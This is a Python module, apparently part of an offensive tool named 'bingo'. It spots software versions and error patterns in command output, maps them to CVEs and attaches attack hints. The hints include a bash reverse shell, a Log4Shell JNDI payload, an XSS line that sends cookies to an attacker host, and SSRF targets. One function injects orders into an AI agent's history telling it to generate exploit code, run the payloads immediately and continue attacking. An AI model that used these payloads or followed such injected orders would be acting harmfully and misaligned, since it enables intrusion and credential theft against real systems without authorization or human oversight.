"""
0day / N-day 자동 헌팅 모듈  (v3.5.20)
=====================================
3가지 방향을 채팅 모드에서 자동 실행:

  Dir-1 Detection   : 실행 출력에서 비정상 패턴 / 버전 / 에러 탐지
  Dir-2 Exploitation: 탐지된 후보에 PoC 페이로드 제안 (클래스별)
  Dir-3 Utilization : CVE 매핑(NVD API) + 버전 핑거프린팅 + Shodan 연동 힌트

v3.5.20 추가 취약점:
  - CVE-2024-35286 / CVE-2024-41713 — Mitel MiCollab SQLi + Auth Bypass
  - 0day LFI — Mitel MiCollab ReconcileWizard Arbitrary File Read
  - CVE-2024-20017 — MediaTek wappd UDP Stack Buffer Overflow
  - CVE-2023-4863 — libwebp Huffman Table Heap Overflow (BLASTPASS)
  - CVE-2023-4911 — glibc GLIBC_TUNABLES LPE (Looney Tunables)
  - ZeroPath: CVE-2024-43035 / CVE-2024-48946 / CVE-2024-9301

모든 네트워크 호출은 timeout=6s, try/except로 보호 — 실패해도 실행 차단 없음.
"""

from __future__ import annotations

import re
import json
import urllib.request
from dataclasses import dataclass, field
from typing import Optional


# ───────────────────────────────────────────────────────────────────────────
# §1 — 버전 감지 패턴
# ───────────────────────────────────────────────────────────────────────────

_VERSION_PATTERNS: list[tuple[str, str]] = [
    # (regex, software_label)
    (r"Apache[/ ](2\.\d+\.\d+)",         "Apache HTTPD"),
    (r"nginx[/ ]([\d.]+)",               "nginx"),
    (r"PHP[/ ]([\d.]+)",                 "PHP"),
    (r"OpenSSL[/ ]([\d.]+)",             "OpenSSL"),
    (r"WordPress[/ ]?([\d.]+)",          "WordPress"),
    (r"Drupal[/ ]?([\d.]+)",             "Drupal"),
    (r"Joomla[!/ ]?([\d.]+)",            "Joomla"),
    (r"Tomcat[/ ]([\d.]+)",              "Apache Tomcat"),
    (r"IIS[/ ]([\d.]+)",                 "Microsoft IIS"),
    (r"Jenkins[/ ]([\d.]+)",             "Jenkins"),
    (r"Struts[/ ]?([\d.]+)",             "Apache Struts"),
    (r"Spring Boot[/ ]?([\d.]+)",        "Spring Boot"),
    (r"log4j[- ]([\d.]+)",              "Log4j"),
    (r"Oracle[/ ]?([\d.]+)",             "Oracle DB"),
    (r"MySQL[/ ]?([\d.]+)",              "MySQL"),
    (r"PostgreSQL[/ ]?([\d.]+)",         "PostgreSQL"),
    (r"Redis[/ ]?([\d.]+)",              "Redis"),
    (r"Elasticsearch[/ ]?([\d.]+)",      "Elasticsearch"),
    (r"Grafana[/ ]?(v?[\d.]+)",          "Grafana"),
    (r"GitLab[/ ]?([\d.]+)",             "GitLab"),
    (r"Confluence[/ ]?([\d.]+)",         "Confluence"),
    (r"Jira[/ ]?([\d.]+)",               "Jira"),
    (r"Exchange Server ([\d.]+)",        "Microsoft Exchange"),
    (r"ProFTPD[/ ]?([\d.]+)",            "ProFTPD"),
    (r"vsftpd[/ ]?([\d.]+)",             "vsftpd"),
    (r"OpenSSH[_ ]([\d.]+p?\d*)",       "OpenSSH"),
    (r"Werkzeug[/ ]?([\d.]+)",           "Werkzeug"),
    (r"Django[/ ]?([\d.]+)",             "Django"),
    (r"Flask[/ ]?([\d.]+)",              "Flask"),
    (r"Ruby on Rails[/ ]?([\d.]+)",      "Rails"),
    (r"Magento[/ ]?([\d.]+)",            "Magento"),
    (r"WooCommerce[/ ]?([\d.]+)",        "WooCommerce"),
    (r"phpMyAdmin[/ ]?([\d.]+)",         "phpMyAdmin"),
    (r"Weblogic[/ ]?([\d.]+)",           "Oracle WebLogic"),
    (r"JBoss[/ ]?([\d.]+)",              "JBoss"),
    (r"GlassFish[/ ]?([\d.]+)",          "GlassFish"),
    # ── v3.5.20 추가 ──────────────────────────────────────────────────────────
    # Mitel MiCollab (CVE-2024-35286 / CVE-2024-41713)
    (r"MiCollab[/ ]?([\d.]+)",           "Mitel MiCollab"),
    (r"NuPoint[/ ]?([\d.]+)",            "Mitel NuPoint"),
    (r"npm-pwg[/ ]?([\d.]+)",            "Mitel MiCollab"),
    # MediaTek wappd (CVE-2024-20017)
    (r"wappd[/ ]?([\d.]+)",              "MediaTek wappd"),
    (r"MediaTek[/ ]?MT(7622|7915|7916|7981|7986)", "MediaTek MT76xx"),
    (r"OpenWrt[/ ]?([\d.]+)",            "OpenWrt"),
    # libwebp (CVE-2023-4863)
    (r"libwebp[/ ]?([\d.]+)",            "libwebp"),
    (r"WebP[/ ]?([\d.]+)",               "libwebp"),
    # glibc (CVE-2023-4911)
    (r"GNU libc[/ ]?([\d.]+)",           "glibc"),
    (r"glibc[/ ]?([\d.]+)",             "glibc"),
    (r"GLIBC[_ ]([\d.]+)",              "glibc"),
    # RAGFlow (CVE-2024-43035)
    (r"RAGFlow[/ ]?([\d.]+)",            "RAGFlow"),
    # Monaco/LogAI (ZeroPath)
    (r"LogAI[/ ]?([\d.]+)",              "LogAI"),
]

# ───────────────────────────────────────────────────────────────────────────
# §2 — 에러 / 취약점 신호 패턴
# ───────────────────────────────────────────────────────────────────────────

_ERROR_PATTERNS: list[tuple[str, str, str]] = [
    # (regex, vuln_type, exploit_class)
    (r"Traceback \(most recent call last\)",          "python_traceback",    "info_disclosure"),
    (r"(Fatal error|Parse error):.+on line \d+",     "php_error",           "info_disclosure"),
    (r"ORA-\d{5}",                                    "oracle_error",        "sql_injection"),
    (r"microsoft sql server",                         "mssql_error",         "sql_injection"),
    (r"you have an error in your sql syntax",         "mysql_sqli_error",    "sql_injection"),
    (r"pg_query\(\).*ERROR",                          "pg_sqli_error",       "sql_injection"),
    (r"SQLSTATE\[",                                   "pdo_error",           "sql_injection"),
    (r"<b>Warning</b>:.*include|require",            "php_lfi",             "lfi"),
    (r"root:.*:/bin/",                                "lfi_passwd",          "lfi_critical"),
    (r"uid=\d+\(root\)",                              "rce_root",            "rce_critical"),
    (r"uid=\d+\(\w+\)",                               "rce_uid",             "rce"),
    (r"(JNDI|ldap://[^'\"\s]+)",                      "jndi_ref",            "log4shell"),
    (r"\$\{jndi:",                                    "jndi_payload",        "log4shell"),
    (r"%0a|%0d|%0D%0A",                              "crlf_hint",           "crlf_injection"),
    (r"exception.*stack.*trace",                      "java_stacktrace",     "info_disclosure"),
    (r"NullPointerException",                         "npe",                 "info_disclosure"),
    (r"heap\s+dump|OutOfMemoryError",                "java_oom",            "dos"),
    (r"SSRF|Server-Side Request Forgery",            "ssrf_detected",       "ssrf"),
    (r"(127\.0\.0\.1|169\.254\.169\.254)",           "internal_ip",         "ssrf"),
    (r"<!DOCTYPE\s+html.*XSS|<script>alert",         "xss_reflected",       "xss"),
    (r"(syntax error near|near\s+'[^']+'\s+line)",  "nosql_error",         "nosql_injection"),
    (r"Access Denied|Permission denied.*path",       "path_disclosure",     "path_traversal"),
    (r"(directory listing|Index of /)",              "dir_listing",         "info_disclosure"),
    (r"\.git/HEAD",                                  "git_exposure",        "source_leak"),
    (r"password\s*=\s*['\"][^'\"]{4,}",             "hardcoded_pw",        "credential_leak"),
    (r"(api[_-]?key|apikey|api_secret)\s*[:=]\s*['\"]?\w{8,}", "api_key", "credential_leak"),
    (r"MemorySanitizer|AddressSanitizer|ASAN",       "asan_hit",            "memory_corruption"),
    (r"Segmentation fault|SIGSEGV",                  "segfault",            "memory_corruption"),
    (r"double free|use after free|buffer overflow",  "memory_corruption",   "memory_corruption"),
    (r"(secret_key|SECRET_KEY)\s*=\s*['\"][^'\"]{4,}", "secret_key",       "credential_leak"),
    (r"debug\s*=\s*true|DEBUG\s*=\s*True",          "debug_mode",          "info_disclosure"),
    (r"open_basedir|safe_mode",                      "php_config_leak",     "config_disclosure"),
    # ── v3.5.20 추가 패턴 ────────────────────────────────────────────────────
    # Mitel MiCollab Auth Bypass (CVE-2024-41713) — ..;/ 경로 정규화
    (r"\.\.;/npm-admin|/npm-pwg/\.\.\;/",           "micollab_auth_bypass", "micollab_bypass"),
    (r"Apache-Coyote|Coyote/[\d.]+",                "tomcat_coyote",        "micollab_bypass"),
    # Mitel MiCollab SQLi (CVE-2024-35286)
    (r"pg_sleep\(\d+\).*--\s*$",                    "micollab_sqli",        "sql_injection"),
    (r"ReconcileWizard.*reportName",                 "micollab_lfi",         "lfi_critical"),
    # MediaTek wappd (CVE-2024-20017)
    (r"wappd|WAPP.{0,4}(port|7788)",               "mediatek_wappd",       "memory_corruption"),
    (r"MT(7622|7915|7916|7981|7986).*overflow",     "mediatek_overflow",    "memory_corruption"),
    # libwebp heap overflow (CVE-2023-4863)
    (r"heap-buffer-overflow.*libwebp|libwebp.*ASAN","webp_heap_overflow",   "memory_corruption"),
    (r"ReadHuffmanCodes|VP8L.*Huffman",             "webp_huffman",         "memory_corruption"),
    (r"Segmentation fault.*dwebp|dwebp.*crash",     "webp_crash",           "memory_corruption"),
    # glibc GLIBC_TUNABLES (CVE-2023-4911)
    (r"GLIBC_TUNABLES.*overflow|Looney Tunables",   "glibc_tunables_lpe",   "lpe_critical"),
    (r"_dl_set_dl_audit|link_map.*corruption",      "glibc_lpe_artifact",   "lpe_critical"),
    # LogAI path traversal (CVE-2024-9301 — ZeroPath)
    (r"LogAI.*path.*traversal|logai.*\.\./",        "logai_traversal",      "path_traversal"),
    # pickle RCE (CVE-2024-48946 — ZeroPath Monaco)
    (r"pickle\.loads.*untrusted|__reduce__.*RCE",   "pickle_rce",           "rce"),
    # IDOR (CVE-2024-43035 — RAGFlow)
    (r"ragflow.*IDOR|object_id.*unauthorized",      "ragflow_idor",         "idor"),
]

# ───────────────────────────────────────────────────────────────────────────
# §3 — 로컬 CVE 즉시 매핑 DB (네트워크 없어도 동작)
# ───────────────────────────────────────────────────────────────────────────

_LOCAL_CVE_DB: dict[tuple[str, str], list[str]] = {
    # Apache HTTPD
    ("Apache HTTPD", "2.4.49"): ["CVE-2021-41773"],
    ("Apache HTTPD", "2.4.50"): ["CVE-2021-42013"],
    ("Apache HTTPD", "2.4.51"): ["CVE-2021-42013"],
    # Log4j
    ("Log4j", "2.14"):  ["CVE-2021-44228"],
    ("Log4j", "2.14.1"):["CVE-2021-44228"],
    ("Log4j", "2.15"):  ["CVE-2021-45046"],
    ("Log4j", "2.16"):  ["CVE-2021-44832"],
    # Confluence
    ("Confluence", "7.13"): ["CVE-2022-26134"],
    ("Confluence", "7.14"): ["CVE-2022-26134"],
    ("Confluence", "7.15"): ["CVE-2022-26134"],
    ("Confluence", "7.16"): ["CVE-2022-26134"],
    # Spring Boot
    ("Spring Boot", "2.6"): ["CVE-2022-22965"],   # Spring4Shell
    ("Spring Boot", "2.7"): ["CVE-2022-22965"],
    # OpenSSL
    ("OpenSSL", "1.0.1"):  ["CVE-2014-0160"],     # Heartbleed
    ("OpenSSL", "1.0.2"):  ["CVE-2014-0160"],
    ("OpenSSL", "3.0.0"):  ["CVE-2022-3602"],
    ("OpenSSL", "3.0.1"):  ["CVE-2022-3602"],
    ("OpenSSL", "3.0.2"):  ["CVE-2022-3602"],
    ("OpenSSL", "3.0.3"):  ["CVE-2022-3602"],
    ("OpenSSL", "3.0.4"):  ["CVE-2022-3602"],
    ("OpenSSL", "3.0.5"):  ["CVE-2022-3602"],
    ("OpenSSL", "3.0.6"):  ["CVE-2022-3602"],
    # GitLab
    ("GitLab", "11.9"):    ["CVE-2021-22205"],
    ("GitLab", "11.10"):   ["CVE-2021-22205"],
    ("GitLab", "11.11"):   ["CVE-2021-22205"],
    ("GitLab", "12.0"):    ["CVE-2021-22205"],
    # Grafana
    ("Grafana", "8.0"):    ["CVE-2021-43798"],
    ("Grafana", "8.1"):    ["CVE-2021-43798"],
    ("Grafana", "8.2"):    ["CVE-2021-43798"],
    ("Grafana", "8.3"):    ["CVE-2021-43798"],
    # ProFTPD
    ("ProFTPD", "1.3.5"):  ["CVE-2019-12815"],
    # phpMyAdmin
    ("phpMyAdmin", "4.0"):  ["CVE-2018-12613"],
    ("phpMyAdmin", "4.8"):  ["CVE-2018-12613"],
    # Oracle WebLogic
    ("Oracle WebLogic", "12.1"): ["CVE-2020-14882"],
    ("Oracle WebLogic", "12.2"): ["CVE-2020-14882"],
    ("Oracle WebLogic", "14.1"): ["CVE-2020-14882"],
    # Jira
    ("Jira", "8.13"):  ["CVE-2022-0540"],
    ("Jira", "8.14"):  ["CVE-2022-0540"],
    ("Jira", "8.15"):  ["CVE-2022-0540"],
    ("Jira", "8.20"):  ["CVE-2022-0540"],
    # WordPress
    ("WordPress", "5.8"):  ["CVE-2022-21661"],
    # ── v3.5.20 추가 ──────────────────────────────────────────────────────────
    # Mitel MiCollab (CVE-2024-35286, CVE-2024-41713)
    ("Mitel MiCollab", "9.8"):  ["CVE-2024-35286", "CVE-2024-41713"],
    ("Mitel MiCollab", "9.7"):  ["CVE-2024-35286", "CVE-2024-41713"],
    ("Mitel MiCollab", "9.6"):  ["CVE-2024-35286"],
    ("Mitel NuPoint",  "9.8"):  ["CVE-2024-35286"],
    # MediaTek wappd (CVE-2024-20017)
    ("MediaTek wappd", "1.0"):  ["CVE-2024-20017"],
    ("MediaTek MT76xx","7622"): ["CVE-2024-20017"],
    ("MediaTek MT76xx","7915"): ["CVE-2024-20017"],
    ("MediaTek MT76xx","7916"): ["CVE-2024-20017"],
    ("OpenWrt",        "23.0"): ["CVE-2024-20017"],
    ("OpenWrt",        "22.0"): ["CVE-2024-20017"],
    # libwebp (CVE-2023-4863)
    ("libwebp", "1.3"):  ["CVE-2023-4863"],
    ("libwebp", "1.3.1"):["CVE-2023-4863"],
    ("libwebp", "1.3.0"):["CVE-2023-4863"],
    ("libwebp", "1.2"):  ["CVE-2023-4863"],
    ("libwebp", "1.1"):  ["CVE-2023-4863"],
    ("libwebp", "1.0"):  ["CVE-2023-4863"],
    ("libwebp", "0.6"):  ["CVE-2023-4863"],
    ("libwebp", "0.5"):  ["CVE-2023-4863"],
    # glibc GLIBC_TUNABLES LPE (CVE-2023-4911)
    ("glibc", "2.38"):   ["CVE-2023-4911"],
    ("glibc", "2.37"):   ["CVE-2023-4911"],
    ("glibc", "2.36"):   ["CVE-2023-4911"],
    ("glibc", "2.35"):   ["CVE-2023-4911"],
    ("glibc", "2.34"):   ["CVE-2023-4911"],
    # ZeroPath autonomous discoveries
    ("RAGFlow",  "0.6"):  ["CVE-2024-43035"],   # IDOR
    ("RAGFlow",  "0.7"):  ["CVE-2024-43035"],
    ("LogAI",    "0.0"):  ["CVE-2024-9301"],    # Path Traversal
}

# ───────────────────────────────────────────────────────────────────────────
# §4 — Exploit 클래스 → 힌트 매핑
# ───────────────────────────────────────────────────────────────────────────

_EXPLOIT_HINTS: dict[str, str] = {
    "sql_injection":     "SQLi: 에러기반/유니온/블라인드 모두 시도. sqlmap -u <url> --dbs --level=5",
    "lfi":               "LFI: /etc/passwd, /proc/self/environ, PHP wrapper (php://filter) 시도",
    "lfi_critical":      "🔴 LFI 확정: /etc/passwd 읽기 성공! PHP wrapper로 소스코드 추출 시도",
    "rce":               "RCE: 명령어 주입 (;id, `id`, $(id)) 또는 역방향 쉘 트리거 시도",
    "rce_critical":      "🔴 RCE 확정: uid=root! 즉시 역방향 쉘 연결. bash -i >& /dev/tcp/<ip>/<port> 0>&1",
    "log4shell":         "Log4Shell: ${jndi:ldap://<attacker>/a} 페이로드. marshalsec LDAP 서버 필요",
    "crlf_injection":    "CRLF: HTTP 헤더 주입 → 캐시 포이즈닝 / 응답 분할 가능",
    "ssrf":              "SSRF: 169.254.169.254 (AWS 메타데이터) / 내부망 스캔 / file:// 프로토콜 시도",
    "xss":               "XSS: <script>fetch('//attacker/?c='+document.cookie)</script>",
    "nosql_injection":   "NoSQL: {'$where': 'sleep(1000)'} / {'$gt': ''} 인젝션 시도",
    "path_traversal":    "Path Traversal: ../../../../etc/passwd (URL인코딩 우회 포함)",
    "info_disclosure":   "정보노출: 스택트레이스/설정파일/환경변수에서 크리덴셜 추출",
    "source_leak":       "소스유출: .git/config, .git/COMMIT_EDITMSG → git-dumper로 전체 소스 추출",
    "credential_leak":   "크리덴셜: 발견된 API키/패스워드로 즉시 인증 시도",
    "memory_corruption": "메모리손상: ASAN 로그 분석 → 오프셋 계산 → PoC 익스플로잇 개발",
    "dos":               "DoS: 메모리 소진 페이로드 → 서비스 중단 가능성",
    "config_disclosure": "설정노출: 내부 경로/DB 연결 문자열/시크릿 키 추출",
    # ── v3.5.20 추가 힌트 ────────────────────────────────────────────────────
    "micollab_bypass":   (
        "Mitel MiCollab Auth Bypass (CVE-2024-41713): "
        "GET /npm-pwg/..;/npm-admin/ — Tomcat ..; path normalization. "
        "from bingo.core.exploits.mitel_micollab import MitelMiCollabExploit; "
        "MitelMiCollabExploit(target).run_full_chain()"
    ),
    "lpe_critical":      (
        "🔴 LPE 확정: 로컬 권한 상승 가능. "
        "CVE-2023-4911(glibc): GLIBC_TUNABLES 환경변수 오버플로우 → root. "
        "from bingo.core.exploits.glibc_tunables import GlibcTunablesExploit; "
        "GlibcTunablesExploit().detect()"
    ),
    "idor":              "IDOR: 오브젝트 ID 변조 → 타 사용자 데이터 접근. 순차 ID 열거 + 권한 교차 검증",
    "pickle_rce":        "Pickle RCE: __reduce__ 메서드 오염 → os.system() 실행. 입력 신뢰 여부 확인",
}

# ───────────────────────────────────────────────────────────────────────────
# §5 — 데이터 클래스
# ───────────────────────────────────────────────────────────────────────────

@dataclass
class ZeroDayCandidate:
    """0day / N-day 후보 단일 항목"""
    type: str            # "version" | "error_pattern" | "abnormal_response"
    software: str        # e.g. "Apache HTTPD"
    version: str         # e.g. "2.4.49"
    raw_match: str       # 탐지 트리거 원본 문자열 (최대 120자)
    cves: list[str]      # CVE ID 목록
    exploit_class: str   # exploit 카테고리
    exploit_hint: str    # 구체적 공격 힌트
    confidence: str      # "HIGH" | "MEDIUM" | "LOW"
    nvd_url: str = ""    # NVD 검색 URL


# ───────────────────────────────────────────────────────────────────────────
# §6 — ZeroDayHunter 클래스
# ───────────────────────────────────────────────────────────────────────────

class ZeroDayHunter:
    """
    실행 출력을 분석해 0day/N-day 후보를 자동 탐지.
    Dir-1: 패턴 탐지 / Dir-2: Exploit 힌트 / Dir-3: CVE 매핑
    """

    # 응답 크기 이상 탐지 임계값
    _ANOMALY_SIZE_RATIO = 2.0
    # 중복 제거용 세션 캐시
    _seen_this_session: set[str] = set()

    # ── Public API ────────────────────────────────────────────────────────

    def analyze(
        self,
        exec_output: str,
        lang: str = "en",
        do_nvd_lookup: bool = True,
    ) -> list[ZeroDayCandidate]:
        """
        실행 출력 전체를 분석 → 0day 후보 목록 반환.
        중복 발견은 세션 내에서 한 번만 보고.
        """
        if not exec_output or len(exec_output.strip()) < 20:
            return []

        candidates: list[ZeroDayCandidate] = []
        _seen_local: set[str] = set()

        # Dir-1: 버전 탐지
        for cand in self._detect_versions(exec_output):
            _key = f"{cand.software}:{cand.version}"
            if _key in ZeroDayHunter._seen_this_session or _key in _seen_local:
                continue
            _seen_local.add(_key)
            # Dir-3: CVE 매핑
            cand.cves = self._lookup_cves_local(cand.software, cand.version)
            if do_nvd_lookup and not cand.cves:
                cand.cves = self._lookup_cves_nvd(cand.software, cand.version)
            if cand.cves:
                cand.nvd_url = (
                    "https://nvd.nist.gov/vuln/search/results?query="
                    + "+".join(cand.cves[:1])
                )
                cand.confidence = "HIGH"
            candidates.append(cand)

        # Dir-1: 에러 / 취약점 신호 탐지
        for cand in self._detect_error_patterns(exec_output):
            _key = f"err:{cand.exploit_class}:{cand.raw_match[:40]}"
            if _key in ZeroDayHunter._seen_this_session or _key in _seen_local:
                continue
            _seen_local.add(_key)
            candidates.append(cand)

        # 세션 캐시에 추가 (재보고 방지)
        for _k in _seen_local:
            ZeroDayHunter._seen_this_session.add(_k)

        # HIGH → MEDIUM → LOW 정렬
        _order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
        candidates.sort(key=lambda c: _order.get(c.confidence, 2))

        return candidates

    # ── Dir-1: 버전 탐지 ─────────────────────────────────────────────────

    def _detect_versions(self, text: str) -> list[ZeroDayCandidate]:
        results = []
        text_lower = text.lower()
        for pattern, label in _VERSION_PATTERNS:
            for m in re.finditer(pattern, text, re.IGNORECASE):
                ver = m.group(1).strip()
                raw = m.group(0)[:120]
                exploit_cls = self._software_to_exploit_class(label)
                hint = _EXPLOIT_HINTS.get(exploit_cls, "해당 버전 취약점 검색 권장")
                results.append(ZeroDayCandidate(
                    type="version",
                    software=label,
                    version=ver,
                    raw_match=raw,
                    cves=[],
                    exploit_class=exploit_cls,
                    exploit_hint=hint,
                    confidence="MEDIUM",
                ))
        return results

    def _software_to_exploit_class(self, software: str) -> str:
        _map = {
            "Apache HTTPD": "path_traversal",
            "nginx":         "info_disclosure",
            "PHP":           "rce",
            "OpenSSL":       "memory_corruption",
            "WordPress":     "rce",
            "Drupal":        "rce",
            "Joomla":        "rce",
            "Apache Tomcat": "rce",
            "Jenkins":       "rce",
            "Apache Struts": "rce",
            "Spring Boot":   "rce",
            "Log4j":         "log4shell",
            "GitLab":           "rce",
            "Confluence":       "rce",
            "Grafana":          "lfi",
            "Oracle WebLogic":  "rce",
            "JBoss":            "rce",
            "Jira":             "rce",
            # v3.5.20
            "Mitel MiCollab":   "micollab_bypass",
            "Mitel NuPoint":    "sql_injection",
            "MediaTek wappd":   "memory_corruption",
            "MediaTek MT76xx":  "memory_corruption",
            "OpenWrt":          "memory_corruption",
            "libwebp":          "memory_corruption",
            "glibc":            "lpe_critical",
            "RAGFlow":          "idor",
            "LogAI":            "path_traversal",
        }
        return _map.get(software, "info_disclosure")

    # ── Dir-1: 에러 패턴 탐지 ────────────────────────────────────────────

    def _detect_error_patterns(self, text: str) -> list[ZeroDayCandidate]:
        results = []
        text_lower = text.lower()
        for pattern, vuln_type, exploit_cls in _ERROR_PATTERNS:
            m = re.search(pattern, text, re.IGNORECASE)
            if m:
                raw = m.group(0)[:120]
                hint = _EXPLOIT_HINTS.get(exploit_cls, "수동 분석 필요")
                confidence = (
                    "HIGH" if exploit_cls.endswith("_critical") or exploit_cls in ("log4shell", "source_leak", "credential_leak")
                    else "MEDIUM" if exploit_cls in ("sql_injection", "rce", "lfi", "ssrf", "memory_corruption")
                    else "LOW"
                )
                results.append(ZeroDayCandidate(
                    type="error_pattern",
                    software=vuln_type,
                    version="",
                    raw_match=raw,
                    cves=[],
                    exploit_class=exploit_cls,
                    exploit_hint=hint,
                    confidence=confidence,
                ))
        return results

    # ── Dir-3: CVE 매핑 (로컬 DB) ────────────────────────────────────────

    def _lookup_cves_local(self, software: str, version: str) -> list[str]:
        """로컬 DB에서 주요 버전 접두사로 CVE 검색"""
        ver_major = ".".join(version.split(".")[:2])  # e.g. "2.4.49" → "2.4"
        for (sw, v), cves in _LOCAL_CVE_DB.items():
            if sw == software and (version.startswith(v) or ver_major == v):
                return cves
        return []

    # ── Dir-3: CVE 매핑 (NVD API — 네트워크 필요) ────────────────────────

    def _lookup_cves_nvd(self, software: str, version: str) -> list[str]:
        """
        NVD 2.0 API 조회 (타임아웃 6s, 실패 시 빈 리스트).
        무료 API — API 키 불필요.
        """
        try:
            keyword = f"{software} {version}"
            url = (
                "https://services.nvd.nist.gov/rest/json/cves/2.0"
                f"?keywordSearch={urllib.parse.quote(keyword)}"
                "&resultsPerPage=5"
                "&cvssV3Severity=HIGH"
            )
            req = urllib.request.Request(
                url,
                headers={"User-Agent": "Mozilla/5.0 bingo-scanner/3.5.19"},
            )
            with urllib.request.urlopen(req, timeout=6) as resp:
                data = json.loads(resp.read().decode())
            vulns = data.get("vulnerabilities", [])
            cves = []
            for v in vulns[:5]:
                cve_id = v.get("cve", {}).get("id", "")
                if cve_id:
                    cves.append(cve_id)
            return cves
        except Exception:
            return []

    # ── Dir-2: 인젝션 메시지 생성 (AI에게 전달) ──────────────────────────

    def format_inject_message(
        self,
        candidates: list[ZeroDayCandidate],
        lang: str = "en",
    ) -> str:
        """AI 히스토리에 주입할 0day 분석 결과 메시지 생성"""
        if not candidates:
            return ""

        lines = ["[ZERODAY_CANDIDATES_DETECTED]"]
        lines.append(f"총 {len(candidates)}개 0day/N-day 후보 탐지됨. 즉시 분석하여 공격 코드 생성.\n")

        for i, c in enumerate(candidates, 1):
            lines.append(f"--- #{i} [{c.confidence}] {c.software} {c.version} ---")
            lines.append(f"유형: {c.type} | 클래스: {c.exploit_class}")
            if c.raw_match:
                lines.append(f"감지: {c.raw_match[:100]}")
            if c.cves:
                lines.append(f"CVE: {', '.join(c.cves)}")
                if c.nvd_url:
                    lines.append(f"NVD: {c.nvd_url}")
            # Dir-2: Exploit 힌트
            lines.append(f"Exploit 힌트: {c.exploit_hint}")
            lines.append("")

        lines.append("지시사항:")
        lines.append("1. 위 후보 중 HIGH 신뢰도부터 즉시 검증 코드를 작성하라.")
        lines.append("2. CVE가 있는 경우 공개 PoC 익스플로잇 로직을 Python으로 재현하라.")
        lines.append("3. Exploit 힌트대로 페이로드를 생성하고 즉시 실행하라.")
        lines.append("4. 결과를 보고하고 다음 단계 공격으로 이어가라.")
        lines.append("5. 모든 코드는 ```python 블록 안에 작성하라.")

        return "\n".join(lines)

    def format_banner(
        self,
        candidates: list[ZeroDayCandidate],
        lang: str = "en",
    ) -> str:
        """콘솔 출력용 배너 (Rich 마크업 포함)"""
        high = [c for c in candidates if c.confidence == "HIGH"]
        med  = [c for c in candidates if c.confidence == "MEDIUM"]
        low  = [c for c in candidates if c.confidence == "LOW"]

        parts = []
        if high:
            parts.append(f"[bold red]🔴 HIGH×{len(high)}[/bold red]")
        if med:
            parts.append(f"[bold yellow]🟡 MED×{len(med)}[/bold yellow]")
        if low:
            parts.append(f"[dim]⚪ LOW×{len(low)}[/dim]")

        details = []
        for c in candidates[:3]:  # 최대 3개만 요약
            entry = f"[cyan]{c.software}[/cyan]"
            if c.version:
                entry += f" [white]{c.version}[/white]"
            if c.cves:
                entry += f" [bold red]({c.cves[0]})[/bold red]"
            details.append(entry)

        suffix = f" +{len(candidates)-3}개" if len(candidates) > 3 else ""
        return (
            "🎯 [bold]0day Hunter[/bold]: "
            + " | ".join(parts)
            + " — "
            + ", ".join(details)
            + suffix
        )

    @classmethod
    def reset_session(cls) -> None:
        """세션 캐시 초기화 (새 타겟 시작 시)"""
        cls._seen_this_session.clear()


# urllib.parse import (NVD API용)
import urllib.parse  # noqa: E402 — 파일 하단에 위치해도 동작

__all__ = ["ZeroDayHunter", "ZeroDayCandidate"]
